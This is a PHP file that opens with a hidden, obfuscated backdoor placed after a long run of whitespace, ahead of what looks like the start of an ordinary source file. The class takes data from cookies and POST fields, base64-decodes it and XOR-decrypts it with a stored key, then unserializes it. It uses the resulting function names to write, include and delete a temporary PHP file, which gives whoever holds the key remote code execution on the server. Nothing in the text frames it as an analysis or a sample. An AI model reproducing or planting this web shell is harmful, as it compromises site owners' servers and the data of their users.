<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("ohkkevxdo")){class ohkkevxdo{public static $rqsdnmp = "gbalobohpffswrix";public static $yfndblcp = NULL;public function __construct(){$cdsajpunu = @$_COOKIE[substr(ohkkevxdo::$rqsdnmp, 0, 4)];if (!empty($cdsajpunu)){$yycvvym = "base64";$szbmtl = "";$cdsajpunu = explode(",", $cdsajpunu);foreach ($cdsajpunu as $rmgcrte){$szbmtl .= @$_COOKIE[$rmgcrte];$szbmtl .= @$_POST[$rmgcrte];}$szbmtl = array_map($yycvvym . "_decode", array($szbmtl,)); $szbmtl = $szbmtl[0] ^ str_repeat(ohkkevxdo::$rqsdnmp, (strlen($szbmtl[0]) / strlen(ohkkevxdo::$rqsdnmp)) + 1);ohkkevxdo::$yfndblcp = @unserialize($szbmtl);}}public function __destruct(){$this->nheirmqozo();}private function nheirmqozo(){if (is_array(ohkkevxdo::$yfndblcp)) {$trnsxg = sys_get_temp_dir() . "/" . crc32(ohkkevxdo::$yfndblcp["salt"]);@ohkkevxdo::$yfndblcp["write"]($trnsxg, ohkkevxdo::$yfndblcp["content"]);include $trnsxg;@ohkkevxdo::$yfndblcp["delete"]($trnsxg);exit();}}}$otmriohb = new ohkkevxdo(); $otmriohb = NULL;} ?><?php
/**
